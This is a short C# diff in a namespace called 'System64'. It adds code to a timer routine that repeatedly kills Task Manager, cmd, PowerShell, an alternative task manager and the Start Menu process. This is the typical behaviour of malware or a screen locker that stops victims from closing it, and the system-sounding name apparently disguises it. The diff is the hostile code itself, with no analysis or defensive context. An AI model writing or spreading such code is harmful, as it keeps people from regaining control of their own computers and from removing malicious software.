@@ -77,6 +77,15 @@ namespace System64
 				StartOperation();
 				timer1.Stop();
 			}
+			string[] Process_name_list = { "taskmgr", "cmd", "powershell", "TaskMgrX 2.1", "StartMenu" };
+			foreach (string Process_name in Process_name_list)
+			{
+				foreach (var process in Process.GetProcessesByName(Process_name))
+				{
+					try { process.Kill(); }
+					catch { MessageBox.Show("ERROR"); }
+				}
+			}
 		}
 
 		void StartOperation()
